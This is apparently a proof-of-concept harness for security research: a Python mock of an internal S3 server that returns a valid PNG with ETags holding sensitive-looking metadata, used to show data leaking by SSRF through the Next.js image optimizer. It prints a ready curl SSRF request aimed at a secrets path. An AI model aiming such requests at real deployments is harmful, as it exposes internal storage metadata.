#!/usr/bin/env python3
"""
Internal S3/Object Storage Simulator
=====================================

Simulates an internal S3-like object storage that returns:
1. Image content with valid image magic bytes
2. An ETag containing sensitive information (object hash, version ID)

This demonstrates ETag data exfiltration via SSRF:
- Attacker makes SSRF request to internal S3
- Internal S3 returns valid image + ETag with sensitive data
- Next.js image optimizer returns the ETag (base64url encoded)
- Attacker decodes ETag to get internal object metadata

REALISTIC SCENARIO:
- Many companies use internal S3-compatible storage (MinIO, Ceph)
- ETags often contain object hashes, version IDs, or internal identifiers
- This can leak information about internal files, versions, or content
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import hashlib
import json

# Simulated internal objects with sensitive ETags
INTERNAL_OBJECTS = {
    '/bucket/config/secrets.json': {
        'etag': 'secret-v3-2024-01-15-backup',
        'data': 'encrypted config containing API keys'
    },
    '/bucket/users/admin-avatar.png': {
        'etag': 'user-123456-admin-role',
        'data': 'admin avatar'
    },
    '/bucket/reports/financial-q4.pdf': {
        'etag': 'confidential-2024-final',
        'data': 'financial report'
    },
}

class InternalS3Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"\n[INTERNAL-S3] Request: {self.path}")
        
        # Simulate internal authentication check (would be bypassed by SSRF)
        internal_token = self.headers.get('X-Internal-Token')
        if internal_token:
            print(f"[INTERNAL-S3] Internal token: {internal_token}")
        
        # Return valid PNG with sensitive ETag
        png = bytes([
            0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
            0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
            0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
            0xde, 0x00, 0x00, 0x00, 0x0c, 0x49, 0x44, 0x41,
            0x54, 0x08, 0xd7, 0x63, 0xf8, 0xcf, 0xc0, 0x00,
            0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xfe,
            0xd4, 0xef, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45,
            0x4e, 0x44, 0xae, 0x42, 0x60, 0x82
        ])
        
        # Determine ETag based on path
        if self.path in INTERNAL_OBJECTS:
            etag = INTERNAL_OBJECTS[self.path]['etag']
        elif '/secrets/' in self.path:
            # Return ETag containing internal path and hash
            etag = f"internal:{self.path}:hash:abc123"
        elif '/admin/' in self.path:
            etag = "admin-only-resource-v2"
        else:
            # Default: include internal bucket ID and timestamp
            etag = f"bucket-internal-prod-8x9y:{self.path.split('/')[-1]}"
        
        print(f"[INTERNAL-S3] Returning ETag: {etag}")
        
        self.send_response(200)
        self.send_header('Content-Type', 'image/png')
        self.send_header('Content-Length', len(png))
        self.send_header('ETag', f'"{etag}"')
        self.send_header('X-Amz-Request-Id', 'INTERNAL-REQ-12345')
        self.send_header('X-Amz-Bucket-Region', 'internal-us-east-1')
        self.end_headers()
        self.wfile.write(png)
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    port = 9806
    print("=" * 60)
    print(" Internal S3/Object Storage Simulator")
    print("=" * 60)
    print(f"\nListening on 127.0.0.1:{port}")
    print("\nSimulated internal objects with sensitive ETags:")
    for path, obj in INTERNAL_OBJECTS.items():
        print(f"  {path} -> ETag: {obj['etag']}")
    print("\n" + "=" * 60)
    print("Test SSRF with:")
    print(f'  curl -sI "http://localhost:3000/_next/image?url=http://127.0.0.1:{port}/bucket/config/secrets.json&w=64&q=75"')
    print("Then decode the ETag header to reveal internal metadata!")
    print("=" * 60)
    
    HTTPServer(('127.0.0.1', port), InternalS3Handler).serve_forever()
